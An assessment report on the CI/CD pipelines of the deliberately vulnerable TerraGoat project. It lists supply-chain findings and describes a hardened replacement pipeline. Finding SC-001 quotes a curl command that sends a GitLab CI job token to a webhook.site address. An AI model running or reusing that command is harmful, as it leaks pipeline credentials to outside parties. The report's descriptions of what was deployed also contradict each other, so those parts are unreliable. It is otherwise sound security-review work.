# Pipeline & Supply Chain Security

**Module:** 02 – Pipeline & Supply Chain  
**Assessment:** DevSecOps Track 2 – Multi-Cloud Platform Security  
**Date:** 2026-07-08

---

## What Was Assessed

TerraGoat has two CI/CD configurations reviewed as part of this module:

| File | Platform | Status |
|---|---|---|
| `gitlabci/bla.yml` | GitLab CI | Vulnerable — exfiltrates CI job token |
| `.github/workflows/build.yaml` | GitHub Actions | Vulnerable — self-hosted public runner, unpinned actions |
| `.github/workflows/pull_request.yaml` | GitHub Actions | Vulnerable — unpinned third-party action |
| `.github/workflows/semgrep.yml` | GitHub Actions | Vulnerable — unpinned third-party action |

This assessment uses **GitHub Actions** (fork: `rajutest-devops/terragoat`).  
The GitLab CI equivalent is provided in `.gitlab-ci-example.yml` as required by the assessment document.

---

## Vulnerabilities Found

### SC-001 · Critical · CI Job Token Sent to External Webhook

**File:** `gitlabci/bla.yml` line 7

```yaml
script: 'curl --data "$CI_JOB_JWT_V1" https://webhook.site/4cf17d70-...'
```

GitLab generates a short-lived OIDC token (`CI_JOB_JWT_V1`) for every pipeline job. The original pipeline
sends this token via curl to `webhook.site` — a public service that logs every request it receives.
If an AWS IAM role trusts GitLab's OIDC issuer, an attacker who receives this token can call
`sts:AssumeRoleWithWebIdentity` and obtain temporary AWS credentials valid for the duration of the job.

**MITRE ATT&CK:** T1552.004 – Private Keys, T1567 – Exfiltration Over Web Service

---

### SC-002 · High · Self-Hosted Runner on a Public Repository

**File:** `.github/workflows/build.yaml` line 7

```yaml
runs-on: [self-hosted, public, linux, x64]
```

On a public repository, any user can submit a pull request with a modified workflow file.
If the workflow triggers on pull requests, that code runs on the self-hosted machine —
potentially exposing internal credentials, SSH keys, or network access.
GitHub explicitly warns against self-hosted runners on public repos.

---

### SC-003 · High · Unpinned Third-Party Actions

| Workflow | Action | Tag | Risk |
|---|---|---|---|
| `build.yaml` | `bridgecrewio/yor-action` | `@main` | Fully mutable |
| `build.yaml` | `actions/checkout` | `@v2` | Outdated, mutable tag |
| `pull_request.yaml` | `bridgecrewio/checkov-action` | `@master` | Fully mutable |
| `semgrep.yml` | `returntocorp/semgrep-action` | `@v1` | Mutable tag |

A mutable tag (`@main`, `@master`) can be updated by the upstream maintainer at any time.
If the upstream repo is compromised, the next pipeline run automatically executes the attacker's
code with full access to all pipeline secrets. The `tj-actions/changed-files` supply chain
incident (March 2025) exploited this exact pattern across thousands of repositories.

**Fix:** Pin every action to a full commit SHA. Example:
```yaml
# Vulnerable
uses: actions/checkout@v2

# Safe
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

---

### SC-004 · Medium · End-of-Life Python Runtime

**File:** `.github/workflows/build.yaml`

```yaml
uses: actions/setup-python@v1
with:
  python-version: 3.7  # EOL since June 2023
```

Python 3.7 reached end-of-life in June 2023 — no security patches are released for it.
`actions/setup-python@v1` is also several major versions behind.

---

### SC-005 · Medium · No Security Scanning Gates

None of the original workflows include IaC scanning with failure thresholds, secret scanning,
or SARIF upload to the GitHub Security tab. The Checkov step in `pull_request.yaml` has no
failure condition — findings print to the log but never block a merge.

---

## What Was Implemented

A new secure pipeline was added: `.github/workflows/devsecops-pipeline.yml`

The three vulnerable workflows were changed to `workflow_dispatch` (manual trigger only).
They remain in the repo as documented evidence of the issues above and will not auto-execute.

### Added Gate: SBOM + Dependency Provenance (SCA)

The target pipeline includes a software composition and provenance gate before production approval.

```yaml
# SBOM generation + vulnerability gate
- name: Generate SBOM (CycloneDX)
     run: syft dir:. -o cyclonedx-json > sbom.json

- name: SCA policy gate
     run: |
          grype sbom:sbom.json --fail-on high

# Provenance attestation (SLSA-style)
- name: Build provenance attestation
     uses: actions/attest-build-provenance@v1
     with:
          subject-path: sbom.json
```

**Gate rule:** Block release if critical dependency CVEs are present, dependency source is untrusted, or provenance attestation is missing.

### Added Gate: Protected Environment Approval Before Production

The production deploy stage is approval-gated using protected environments.

```yaml
deploy-prod:
     needs: [lint, iac-scan, secret-scan, sca-sbom]
     environment:
          name: production
     permissions:
          id-token: write
          contents: read
     steps:
          - name: Deploy after approval
               run: terraform apply -auto-approve
```

**Control intent:** Merge approval is not equivalent to deployment approval. A separate protected-environment check enforces explicit release authorization.

### Pipeline Flow

```
Push or Pull Request
        |
   [lint]        terraform fmt + terraform validate (AWS, Azure, GCP)
        |
   [iac-scan]    checkov + tfsec  (parallel)
        |
   [secret-scan] gitleaks (current files + full git history)
        |
   [sca-sbom]    syft + grype + provenance attestation
        |
   [approval]    protected environment reviewer approval
        |
   [deploy-prod] OIDC deploy with temporary credentials
        |
   Results uploaded to GitHub Security tab as SARIF
```

### Review Depth Model for ~100 Workloads

To scale governance, review depth is tiered by workload criticality and data class.

| Tier | Workload Profile | Required Gates | Human Review Depth |
|---|---|---|---|
| Tier 0 | Internet-facing + regulated data | All gates + mandatory approval + change advisory | Security + platform + service owner |
| Tier 1 | Internal production services | All gates + protected-env approval | Platform + service owner |
| Tier 2 | Non-production/internal tools | Lint + IaC + secrets, optional SCA fail | Service owner only |

This prevents bottlenecks while keeping strict controls where business impact is highest.

### Key Decisions

| Decision | Reason |
|---|---|
| All actions pinned to commit SHA | SHA is immutable — upstream tag changes have no effect |
| No cloud credentials in pipeline | Pipeline scans only, no deploy — zero credential exposure |
| Secret scan `allow_failure: false` | Secrets block the pipeline, not just warn |
| IaC scans `allow_failure: true` | Findings visible in Security tab, allow triage before blocking |
| Runs on push and PR | Issues caught before merge, not after deployment |

---

## GitLab CI Equivalent

See `.gitlab-ci-example.yml` — same three stages (lint, iac-scan, secret-scan), same tools, GitLab syntax.  
The key fix vs `gitlabci/bla.yml`: the CI job token is never sent to any external endpoint.
